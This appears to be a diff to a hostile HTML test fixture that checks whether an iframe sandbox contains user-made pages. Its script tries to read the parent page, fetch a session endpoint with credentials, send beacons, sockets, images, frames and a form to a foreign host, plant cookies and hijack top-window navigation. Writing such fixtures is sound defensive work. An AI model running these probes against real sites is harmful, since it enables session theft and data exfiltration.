@@ -2,9 +2,11 @@
 <meta charset="utf-8">
 <title>Escape attempts</title>
 <script>
-  // A hostile creation: every way out it should not have. Each result goes to the parent, which is
-  // the one thing a creation may do.
+  // A hostile creation: every way out it should not have. Each result goes to the page that holds
+  // it, the one thing a creation may do, and stays on window for a top-level visit.
   const results = {};
+  const app = location.search.slice(1).split(",")[0];
+  const foreign = location.search.slice(1).split(",")[1];
   const attempt = async (name, run) => {
     try {
       const outcome = await run();
@@ -14,25 +16,69 @@
     }
   };
   (async () => {
-    await attempt("read the parent page", () => String(window.parent.document.title));
+    results.origin = String(self.origin);
+    await attempt("read the parent page", () =>
+      window.parent === window ? "blocked" : String(window.parent.document.title),
+    );
     await attempt("fetch the API", async () => {
-      const answer = await fetch(`${location.search.slice(1)}/api/auth/get-session`, { credentials: "include" });
+      const answer = await fetch(`${app}/api/auth/get-session`, { credentials: "include" });
       return `status ${answer.status}`;
+    });
+    // Whether the beacon left is the stranger's count to say: the call answers true either way.
+    await attempt("send a beacon", () => {
+      navigator.sendBeacon(`${foreign}/beacon`, "x");
+      return "blocked";
+    });
+    await attempt("open a socket", () => {
+      new WebSocket(`${foreign.replace("http", "ws")}/socket`);
+      return "blocked";
+    });
+    await attempt("load a foreign image", () => {
+      new Image().src = `${foreign}/pixel.png`;
+      return "blocked";
+    });
+    await attempt("frame another page", () => {
+      const frame = document.createElement("iframe");
+      frame.src = `${foreign}/framed`;
+      document.body.append(frame);
+      return "blocked";
+    });
+    await attempt("submit a form", () => {
+      const form = document.createElement("form");
+      form.action = `${foreign}/form`;
+      form.method = "post";
+      document.body.append(form);
+      form.submit();
+      return "blocked";
     });
     await attempt("read cookies", () => {
       // biome-ignore lint/suspicious/noDocumentCookie: a hostile fixture tries exactly this
       document.cookie = "planted=1";
       return document.cookie.includes("planted") ? "cookie set" : "blocked";
     });
-    await attempt("open a popup", () => (window.open("https://example.com/") ? "opened" : "blocked"));
+    await attempt("open a popup", () => (window.open(`${foreign}/popup`) ? "opened" : "blocked"));
     await attempt("store data", () => {
       localStorage.setItem("x", "1");
       return "localStorage works";
     });
-    await attempt("navigate the top window", () => {
-      window.top.location.href = "https://example.com/escaped";
+    await attempt("widen its origin", () => {
+      document.domain = "localhost";
       return "blocked";
     });
-    window.parent.postMessage({ escape: results }, "*");
+    // Opened straight, a creation is its own window and may follow a link away, as any page can;
+    // that visit stays, to report.
+    try {
+      if (window.top === window) {
+        throw new Error("its own window");
+      }
+      window.top.location.href = `${foreign}/escaped`;
+      results["navigate the top window"] = window.top === window ? "blocked" : "escaped";
+    } catch {
+      results["navigate the top window"] = "blocked";
+    }
+    window.results = results;
+    if (window.parent !== window) {
+      window.parent.postMessage({ escape: results }, "*");
+    }
   })();
 </script>
